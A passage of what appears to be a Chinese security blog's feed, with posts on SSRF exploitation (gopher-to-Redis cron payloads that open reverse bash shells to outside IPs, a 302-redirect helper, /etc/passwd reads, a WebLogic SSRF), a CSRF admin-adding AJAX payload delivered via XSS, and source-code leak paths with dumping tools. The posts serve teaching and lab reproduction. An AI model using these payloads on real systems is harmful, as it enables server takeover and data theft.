&apos;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</div></pre></td></tr></table></figure>
<h4 id="漏洞代码ssrf2-php"><a href="#漏洞代码ssrf2-php" class="headerlink" title="漏洞代码ssrf2.php"></a>漏洞代码ssrf2.php</h4><ul>
<li>限制协议为HTTP、HTTPS</li>
<li>设置跳转重定向为True（默认不跳转）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">function curl($url)&#123;</div><div class="line">    $ch = curl_init();</div><div class="line">    curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</div><div class="line">    // 限制为HTTPS、HTTP协议</div><div class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</div><div class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</div><div class="line">    curl_exec($ch);</div><div class="line">    curl_close($ch);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$url = $_GET[&apos;url&apos;];</div><div class="line">curl($url);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="远程利用方式-1"><a href="#远程利用方式-1" class="headerlink" title="远程利用方式"></a>远程利用方式</h4><p>当URL存在临时(302)或永久(301)跳转时，则继续请求跳转后的URL</p>
<p>那么我们可以通过HTTP(S)的链接302跳转到gopher协议上。</p>
<p>我们继续构造一个302跳转服务，代码如下302.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$schema = $_GET[&apos;s&apos;];</div><div class="line">$ip     = $_GET[&apos;i&apos;];</div><div class="line">$port   = $_GET[&apos;p&apos;];</div><div class="line">$query  = $_GET[&apos;q&apos;];</div><div class="line">if(empty($port))&#123;  </div><div class="line">    header(&quot;Location: $schema://$ip/$query&quot;); </div><div class="line">&#125; else &#123;</div><div class="line">    header(&quot;Location: $schema://$ip:$port/$query&quot;); </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h4 id="利用测试"><a href="#利用测试" class="headerlink" title="利用测试"></a>利用测试</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"># dict protocol - 探测Redis</div><div class="line">dict://127.0.0.1:6379/info  </div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info&apos;</div><div class="line"></div><div class="line"># file protocol - 任意文件读取</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd&apos;</div><div class="line"></div><div class="line"># gopher protocol - 一键反弹Bash</div><div class="line"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</div><div class="line">curl -vvv &apos;http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0  </div><div class="line">a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d  </div><div class="line">%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3</div><div class="line">%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&apos;</div></pre></td></tr></table></figure>
<h2 id="Weblogic-SSRF漏洞复现"><a href="#Weblogic-SSRF漏洞复现" class="headerlink" title="Weblogic SSRF漏洞复现"></a>Weblogic SSRF漏洞复现</h2><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>SSRF漏洞存在于<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求" target="_blank" rel="external">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp页面的数据包中的operator参数，这个参数可以发送任意的HTTP请求</a></p>
<h3 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h3><h4 id="探查服务端口"><a href="#探查服务端口" class="headerlink" title="探查服务端口"></a>探查服务端口</h4><p>在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如<a href="http://127.0.0.1:7001" target="_blank" rel="external">http://127.0.0.1:7001</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1</div><div class="line">Host: http://127.0.0.1:7001</div><div class="line">Content-Length: 133</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://127.0.0.1:7001</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://115.159.4.50:7001/uddiexplorer/SearchPublicRegistries.jsp</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Cookie: publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|; JSESSIONID=CZBhZtjHKR2mvqmnyBbVchhHvJ1KJ48lq4rq84pZnpFL2hkXrnhc!1235713544</div><div class="line">Connection: close</div><div class="line"></div><div class="line">operator=http://127.0.0.1:7001&amp;rdoSearch=name&amp;txtSearchname=1&amp;txtSearchkey=1&amp;txtSearchfor=1&amp;selfor=Business+location&amp;btnSubmit=Search</div></pre></td></tr></table></figure></p>
<p>返回以下信息，说明存在7001端口的服务器<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf.png" alt=""></p>
<p>访问一个不存在的IP，返回以下信息，返回 but could not connect over HTTP to server<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf1.png" alt=""></p>
<p>访问一个非HTTP（dict）协议，返回以下信息，返回unknown protocol: dict<br><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf2.png" alt=""></p>
<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.18.0.2:6379可以连通<br>返回<br>which did not have a valid SOAP content-type: null<br>说明存在redis服务</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/w-ssrf3.png" alt=""></p>
<p>发送三条redis命令，将弹shell脚本写入/etc/crontab：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot;</div><div class="line">config set dir /etc/</div><div class="line">config set dbfilename crontab</div><div class="line">save</div></pre></td></tr></table></figure>
<p>进行url编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</div></pre></td></tr></table></figure></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ssrf-w2.png" alt=""></p>
<p>反弹shell</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/ssrf-w.png" alt=""></p>
<p>最后补充一下，可进行利用的cron有如下几个地方：</p>
<ul>
<li>/etc/crontab 这个是肯定的</li>
<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://joychou.org/index.php/web/phpssrf.html" target="_blank" rel="external">SSRF in PHP</a><br><a href="http://blog.feei.cn/ssrf/" target="_blank" rel="external">SSRF to GET SHELL</a><br><a href="https://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2" target="_blank" rel="external">利用 gopher 协议拓展攻击面</a><br><a href="https://github.com/phith0n/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="external">vulhub/weblogic/ssrf</a><br><a href="https://_thorns.gitbooks.io/sec/content/teng_xun_mou_chu_ssrf_lou_6d1e28_fei_chang_hao_de_.html" target="_blank" rel="external">腾讯某处SSRF漏洞(非常好的利用点)附利用脚本</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>CSRF漏洞的利用与学习</title>
    <link href="http://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://uknowsec.cn/posts/notes/CSRF漏洞的利用与学习.html</id>
    <published>2017-07-14T02:50:29.000Z</published>
    <updated>2017-07-14T07:04:36.915Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h2><p>发现漏洞可利用处-&gt;构造(搭建)搭建代码-&gt;发送给用户(管理员)-&gt;触发代码(发送请求)………</p>
<p>从这个利用的一个流程中，我们可以发现,攻击者仅仅只是做了两处工作.第一处是:发现漏洞利用处，，第二处就是构造利用代码以及发送至用户(管理员)。至于利用，你会发现CSRF与XSS不同，XSS是攻击者自己提交，等待结果，而CSRF呢，是由用户(管理员)自身提交。甚至可以说攻击者只做了构造代码的工作。</p>
<h2 id="OWASP-CSRFTester"><a href="#OWASP-CSRFTester" class="headerlink" title="OWASP CSRFTester"></a>OWASP CSRFTester</h2><p>这是OWASP推出的CSRF半自动化软件，他省去了CSRF最繁琐的过程，代码构造。下面是软件的截图‍‍</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF1.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF2.jpg" alt=""></p>
<h2 id="利用CSRFTester进行CSRF攻击"><a href="#利用CSRFTester进行CSRF攻击" class="headerlink" title="利用CSRFTester进行CSRF攻击"></a>利用CSRFTester进行CSRF攻击</h2><p>进入已经搭建的CMS后台的管理员管理模块</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF3.jpg" alt=""></p>
<p>浏览器里代理设置为CSRFTester的代理127.0.0.1：8008</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF4.jpg" alt=""></p>
<p>开启CSRFTester抓取数据包，正常添加管理员 返回可以看到已经抓取到了数据包<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF5.jpg" alt=""></p>
<p>在Form Parameters中没有找到token的值，那么就可以实现CSRF攻击</p>
<p>在Report Type中。有四种方法来进行攻击。‍‍</p>
<ul>
<li>‍‍Forms：创建一个form表单。内容为hidden(隐藏)，用户不可见（可POST、GET）‍‍<br>‍‍<em>    iFrame：创建一个iframe框架，高宽为0，用户不可见。（可POST、GET）‍‍<br>‍‍</em>    IMG：创建一个IMG标签(只能GET)。‍‍<br>‍‍<em>    XHR：创建一个AJAX请求(可POST、GET)‍‍<br>‍‍</em>    Link：创建一个a标签的超链接(只能GET)</li>
</ul>
<p>此处先选择Forms进行测试</p>
<p>点击Generate HTML 便生成了一个index.html</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF6.jpg" alt=""></p>
<p>由其中的HTML源码可以看出这是一个简单的提交表单，点击运行这个html文件<br>可以看到成功的添加了一个管理员用户</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF7.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF8.jpg" alt=""></p>
<p>到此利用CSRFTester进行CSRF攻击成功</p>
<h2 id="构造提交表单进行CSRF攻击"><a href="#构造提交表单进行CSRF攻击" class="headerlink" title="构造提交表单进行CSRF攻击"></a>构造提交表单进行CSRF攻击</h2><p>审查元素得到管理员管理的URL，进入查看源码。分析提交表单</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF9.jpg" alt=""></p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF10.jpg" alt=""></p>
<p>修改提交表单</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF11.jpg" alt=""></p>
<p>点击按钮提交，成功添加管理员<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF12.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF13.jpg" alt=""></p>
<p>在html中增加javascript脚本，自动提交表单<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF14.jpg" alt=""></p>
<h2 id="利用ajax结合xss进行CSRF攻击"><a href="#利用ajax结合xss进行CSRF攻击" class="headerlink" title="利用ajax结合xss进行CSRF攻击"></a>利用ajax结合xss进行CSRF攻击</h2><p>就是把CSRF的AJAX请求放到XSS里，以达到攻击的效果</p>
<p>在测试用的这套CMS的留言板处就存在存储型XSS漏洞</p>
<p>在这里我们可以使用CSRFTester生成一个ajax</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF15.jpg" alt=""></p>
<p>我们可以看到ajax中核心部分<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF16.jpg" alt=""></p>
<p>同时也可以自己编写一个简单的ajax</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">var xmlhttp;</div><div class="line">if(window.XMLHttpRequest)&#123;</div><div class="line">  xmlhttp=new XMLHttpRequest();</div><div class="line">  &#125;else&#123;</div><div class="line">  xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</div><div class="line">  &#125;</div><div class="line">xmlhttp.open(&quot;POST&quot;,&quot;/admin/admin_manage.asp?act=add&quot;,true);</div><div class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</div><div class="line">xmlhttp.send(&quot;admin=789&amp;password=789&amp;password3=789&amp;button=提交数据&quot;);</div></pre></td></tr></table></figure>
<p>在xss平台上配置项目<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF17.jpg" alt=""></p>
<p>然后插入测试网站的留言板里<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF18.jpg" alt=""></p>
<p>管理员查看留言信息就能添加一个管理员账号了<br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF19.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/CSRF20.jpg" alt=""></p>
<h2 id="CSRF-漏洞防护"><a href="#CSRF-漏洞防护" class="headerlink" title="CSRF 漏洞防护"></a>CSRF 漏洞防护</h2><p>其实现在有关CSRF漏洞防护已经是比较成熟了，其主要防护的思路就是需要在进行后台数据修改操作的过程中，添加对当前用户身份的有效验证措施，而不能仅限于cookie的识别，这里简单的罗列了下防护措施如下。</p>
<p>（1） 来源校验</p>
<p>使用http请求头中referer来源，对客户端源进行身份校验，此方法早期使用比较多，但是仍然容易被绕过，所以这里并不建议使用。</p>
<p>（2） 用户token 校验</p>
<p>添加基于当前用户身份的有效tokens随机验证机制，即在向后端提交数据操作请求时，添加基于当前用户的随机token校验值，此种校验方法当前使用比较多；</p>
<p>（3）当前用户密码验证</p>
<p>在修改关键信息时，要钱当前用户输入其自身的密码，以验证当前用户身份的真伪，防止未授权的恶意操作；</p>
<p>（4）添加验证机制</p>
<p>在请求数据的提交前，需填写验证码信息提交，以增加对用户来源的有效验证，防止恶意未授权的操作产生。</p>
<p>参考链接：<br><a href="http://www.test404.com/post-1410.html" target="_blank" rel="external">http://www.test404.com/post-1410.html</a><br><a href="http://www.freebuf.com/articles/web/55965.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/55965.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>常见Web源码泄露总结</title>
    <link href="http://uknowsec.cn/posts/ctf/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93.html"/>
    <id>http://uknowsec.cn/posts/ctf/常见Web源码泄露总结.html</id>
    <published>2017-07-14T01:49:47.000Z</published>
    <updated>2017-07-14T02:00:20.346Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。</p>
<h2 id="源码泄漏分类"><a href="#源码泄漏分类" class="headerlink" title="源码泄漏分类"></a>源码泄漏分类</h2><h3 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h3><h4 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>hg init的时候会生成.hg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g.http://www.example.com/.hg/</div></pre></td></tr></table></figure></p>
<h4 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-hg.pl -v -u http://www.example.com/.hg/</div></pre></td></tr></table></figure></p>
<h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><h4 id="漏洞成因：-1"><a href="#漏洞成因：-1" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g. http://www.example.com/.git/config</div></pre></td></tr></table></figure></p>
<h4 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h4><p>工具：</p>
<p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="external">GitHack</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GitHack.py http://www.example.com/.git/</div></pre></td></tr></table></figure></p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-git.pl -v -u http://www.example.com/.git/</div></pre></td></tr></table></figure></p>
<h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因:"></a>漏洞成因:</h4><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.example.com/.ds_store</div></pre></td></tr></table></figure>
<p>注意路径检查</p>
<p>工具：</p>
<p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="external">dsstoreexp</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python ds_store_exp.py http://www.example.com/.DS_Store</div></pre></td></tr></table></figure></p>
<h3 id="网站备份压缩文件"><a href="#网站备份压缩文件" class="headerlink" title="网站备份压缩文件"></a>网站备份压缩文件</h3><p>在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p>
<h4 id="漏洞成因及危害"><a href="#漏洞成因及危害" class="headerlink" title="漏洞成因及危害:"></a>漏洞成因及危害:</h4><p>该漏洞的成因主要有以下两种：</p>
<p>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。<br>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</p>
<h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测:"></a>漏洞检测:</h4><p>该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line">.zip</div><div class="line">.7z</div><div class="line">.tar.gz</div><div class="line">.bak</div><div class="line">.swp</div><div class="line">.txt</div><div class="line">.html</div></pre></td></tr></table></figure></p>
<h3 id="SVN导致文件泄露"><a href="#SVN导致文件泄露" class="headerlink" title="SVN导致文件泄露"></a>SVN导致文件泄露</h3><p>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p>
<p>Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">e.g.http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</div></pre></td></tr></table></figure>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用:"></a>漏洞利用:</h4><p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-svn.pl -v -u http://www.example.com/.svn/</div></pre></td></tr></table></figure>
<p>Seay-Svn</p>
<h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<ul>
<li>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li>
<li>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</li>
<li>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</li>
<li>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</li>
<li>/WEB-INF/database.properties：数据库配置文件<h4 id="漏洞成因：-2"><a href="#漏洞成因：-2" class="headerlink" title="漏洞成因："></a>漏洞成因：</h4></li>
</ul>
<p>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<p>漏洞检测以及利用方法：</p>
<p>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。<br>一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！</p>
<h3 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h3><h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>测试的目录</p>
<ul>
<li><a href="http://url/CVS/Root" target="_blank" rel="external">http://url/CVS/Root</a> 返回根信息</li>
<li><a href="http://url/CVS/Entries" target="_blank" rel="external">http://url/CVS/Entries</a> 返回所有文件的结构<br>取回源码的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bk clone http://url/name dir</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
<p>查看所有的改变的命令，转到download的目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bk changes</div><div class="line">Bazaar/bzr</div></pre></td></tr></table></figure></p>
<p>工具：</p>
<p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="external">dvcs-ripper</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</div></pre></td></tr></table></figure></p>
<p>工具推荐</p>
<p>Bitkeeper<br>weakfilescan</p>
